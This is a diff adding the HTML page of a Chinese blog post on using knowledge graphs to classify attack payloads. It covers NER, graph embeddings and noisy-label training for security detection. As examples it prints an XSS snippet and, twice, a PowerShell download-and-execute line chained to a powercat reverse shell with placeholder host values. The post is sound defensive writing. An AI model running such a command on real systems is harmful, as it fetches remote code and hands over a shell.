@@ -1,0 +1,65 @@
+<!DOCTYPE html><html lang="zh-cn" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>知识图谱在安全中的应用 | Chinfo's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>知识图谱在安全中的应用</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-01-20T08:08:34.000Z" id="date"> 2024-01-20</time></div></span><br><span>文章总字数: <div class="control">2.3k</div></span><br><span>预计阅读时间: <div class="control">7 分钟</div></span></div></div><hr><div id="post-content"><h1 id="图谱建设"><a href="#图谱建设" class="headerlink" title="图谱建设"></a>图谱建设</h1><h2 id="层级体系建设"><a href="#层级体系建设" class="headerlink" title="层级体系建设"></a>层级体系建设</h2><p>相比于深度学习，知识图谱中的知识可以沉淀，具有较强的解释性。</p>
+<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/Ch1nfo/picbed@main/img/image-20240119170540039.png'><img src="https://cdn.jsdelivr.net/gh/Ch1nfo/picbed@main/img/image-20240119170540039.png" alt="image-20240119170540039"></p>
+<p>知识图谱的构建可以从多层级＋多维度的方式构建</p>
+<p>多层级可以从基础对象开始，逐级扩大范围，从具体到抽象</p>
+<p>多维度则是丰富对象视角，也可以从具象的丰富到抽象的丰富</p>
+<p>知识图谱的构建所面对的问题：</p>
+<p>①信息来原质量低，导致信息挖掘难度增加</p>
+<p>②数据维度多，导致数据建设效率降低</p>
+<p>③依赖常识&#x2F;专业知识，某些日常对象要结合生活经验，需要探索结合常识知识的语义理解方法，某些对象要求极高的准确度，需要较好的专家和算法相结合的方式来进行高效的图谱构建</p>
+<p><strong>品类打标</strong>：对商品图谱的构建来说，关键的一步便是建立起商品和品类之间的关联，即对商品打上品类标签。从安全方面来说，既需要建立payload中的关键字和攻击类型之间的联系。</p>
+<p>以安全为例：</p>
+<p>①攻击类型词表构建：通过对获取的数据集进行分词、NER、新词发现等操作，获得初步的关键字候选词。然后，通过标注少量的样本进行二分类模型的训练（判断一个词是否是同一种攻击类型）。</p>
+<p>②攻击类型打标：首先，我们通过对payload进行命名实体识别，并结合上一步中的攻击类型词表来获取payload中的候选攻击类型，如识别“<div onclick ="alert('xss')">”中的“<div>”、“alert()”等。在获得了payload以及对应的类型之后，我们利用监督数据训练品类打标的二分类模型，输入payload的SPU_ID和候选类型TAG构成的Pair，即，对它进行是否匹配的预测</p>
+<p>③攻击类型标签后处理：配合其他设备或攻击选择对流量进行拦截或放行。</p>
+<p><strong>类关系挖掘</strong>。类似于上文中提到的攻击类型打标方法，我们将同类型payload和上下位构建为的样本，通过在流量数据、日志数据、百科数据等中挖掘的统计特征以及基于Sentence-BERT得到的语义特征，使用二分类模型进行品类关系是否成立的判断。对于训练得到的分类模型，我们同样通过主动学习的方式，选出结果中的难分样本，进行二次标注，进而不断迭代数据，提高模型性能。 </p>
+<p><strong>基于图的品类关系推理</strong>。在获得了初步的同类payload、上下位关系之后，我们使用已有的这些关系构建网络，使用GAE、VGAE等方法对网络进行链路预测，从而进行图谱边关系的补全。</p>
+<h2 id="属性维度建设"><a href="#属性维度建设" class="headerlink" title="属性维度建设"></a>属性维度建设</h2><p>对于一次攻击的全面理解，需要涵盖各个属性维度。例如“powershell IEX (New-Object System.Net.Webclient).DownloadString (‘url’); powercat -c IP -p port -e cmd”，需要挖掘它对应的方式，目的，攻击路径等属性，才能在产品中更好的进行综合判断，进行拦截或放行操作。payload属性挖掘的源数据主要包含攻击类型，攻击方式和半结构化数据三个方面。</p>
+<p>攻击类型包含了对于payload最重要的信息维度，同时，攻击类型解析模型可以应用在查询理解中，对用户快速深入理解拆分，为下游的召回排序也能提供高阶特征。这里我们着重介绍一下利用攻击类型进行属性抽取的方法。</p>
+<p>然而攻击类型解析存在着三大挑战：（1）上下文信息少；（2）依赖专业知识；（3）标注数据通常有较多的噪音。为了解决前两个挑战，我们首先尝试在模型中引入了图谱信息，主要包含以下三个维度：</p>
+<ul>
+<li><strong>节点信息</strong>：将图谱实体作为词典，以Soft-Lexicon方式接入，以此来缓解NER的边界切分错误问题。</li>
+<li><strong>关联信息</strong>：攻击类型解析依赖专业知识，例如在缺乏专业知识的情况下，仅从“powershell IEX (New-Object System.Net.Webclient).DownloadString (‘url’); powercat -c IP -p port -e cmd”中，我们无法确认“powershell IEX”是攻击类型还是攻击方式。因此，我们引入知识图谱的关联数据缓解了专业知识缺失的问题：在知识图谱中，powershell IEX和System，DownloadString，powercat之间存在着“方式-方法-类型”的关联关系，但是powershell跟powercat之间则没有直接的关系，因此可以利用图结构来缓解NER模型常识知识缺少的问题。具体来说，我们利用Graph Embedding的技术对图谱进行的嵌入表征，利用图谱的图结构信息对图谱中的单字，词进行表示，然后将包含了图谱结构信息的嵌入表示和文本语义的表征进行拼接融合，再接入到NER模型之中，使得模型能够既考虑到语义，也考虑到常识知识的信息。</li>
+<li><strong>节点类型信息</strong>：同一个词可以代表不同的属性，比如“poweshell”既可以作为品类又可以作为属性。因此，对图谱进行Graph Embedding建模的时候，我们根据不同的类型对实体节点进行拆分。在将图谱节点表征接入NER模型中时，再利用注意力机制根据上下文来选择更符合语义的实体类型对应的表征 ，缓解不同类型下词语含义不同的问题，实现不同类型实体的融合。</li>
+</ul>
+<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/Ch1nfo/picbed@main/img/image-20240120162526667.png'><img src="https://cdn.jsdelivr.net/gh/Ch1nfo/picbed@main/img/image-20240120162526667.png" alt="image-20240120162526667"></p>
+<p>接下来我们探讨如何缓解标注噪音的问题。在标注过程中，少标漏标或错标的问题无法避免，尤其像在商品标题NER这种标注比较复杂的问题上，尤为显著。对于标注数据中的噪音问题，采用以下方式对噪音标注优化：不再采取原先非0即1的Hard的训练方式，而是采用基于置信度数据的Soft训练方式，然后再通过Bootstrapping的方式迭代交叉验证，然后根据当前的训练集的置信度进行调整。通过实验验证，使用Soft训练+Bootstrapping多轮迭代的方式，在噪声比例比较大的数据集上，模型效果得到了明显提升。具体的方法可参见论文《Iterative Strategy for Named Entity Recognition with Imperfect Annotations》。</p>
+<h2 id="效率提升"><a href="#效率提升" class="headerlink" title="效率提升"></a>效率提升</h2><p>知识图谱的构建往往是针对于各个领域维度的数据单独制定的挖掘方式。这种挖掘方式重人工，比较低效，针对每个不同的领域、每个不同的数据维度，我们都需要定制化的去建设任务相关的特征及标注数据。在安全场景下，挖掘的维度众多，因此效率方面的提高也是至关重要的。我们首先将知识挖掘任务建模为三类分类任务，包括节点建模、关系建模以及节点关联。在整个模型的训练过程中，最需要进行效率优化的其实就是上述提到的两个步骤：（1）针对任务的特征提取；（2）针对任务的数据标注。</p>
+<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/Ch1nfo/picbed@main/img/image-20240120162827610.png'><img src="https://cdn.jsdelivr.net/gh/Ch1nfo/picbed@main/img/image-20240120162827610.png" alt="image-20240120162827610"></p>
+<p>针对特征提取部分，我们摒弃了针对不同挖掘任务做定制化特征挖掘的方式，而是尝试将特征和任务解耦，构建跨任务通用的图谱挖掘特征体系，利用海量的特征库来对目标的节点&#x2F;关系&#x2F;关联进行表征，并利用监督训练数据来进行特征的组合和选择。具体的，我们构建的图谱特征体系主要由四个类型的特征组构成： 1. 规则模板型特征主要是利用人工先验知识，融合规则模型能力。 2. 统计分布型特征，可以充分利用各类语料，基于不同语料不同层级维度进行统计。 3. 句法分析型特征则是利用NLP领域的模型能力，引入分词、词性、句法等维度特征。 4. 嵌入表示型特征，则是利用高阶模型能力，引入BERT等语义理解模型的能力。</p>
+<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/Ch1nfo/picbed@main/img/image-20240120162852777.png'><img src="https://cdn.jsdelivr.net/gh/Ch1nfo/picbed@main/img/image-20240120162852777.png" alt="image-20240120162852777"></p>
+<p>针对数据标注部分，我们主要从三个角度来提升效率。 1. 通过半监督学习，充分的利用未标注的数据进行预训练。 2. 通过主动学习技术，选择对于模型来说能够提供最多信息增益的样本进行标注。 3. 利用远程监督方法，通过已有的知识构造远监督样本进行模型训练，尽可能的发挥出已有知识的价值。</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2025/01/05/1/">← 下一篇 </a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/26/Word2Vec%E5%9C%A8NLP%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">Word2Vec在NLP中的应用 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chinfo's Blog</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/Ch1nfo"><i class="fab fa-github" alt="GitHub"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BE%E8%B0%B1%E5%BB%BA%E8%AE%BE"><span class="toc-number">1.</span> <span class="toc-text">图谱建设</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B1%82%E7%BA%A7%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE"><span class="toc-number">1.1.</span> <span class="toc-text">层级体系建设</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7%E7%BB%B4%E5%BA%A6%E5%BB%BA%E8%AE%BE"><span class="toc-number">1.2.</span> <span class="toc-text">属性维度建设</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">效率提升</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
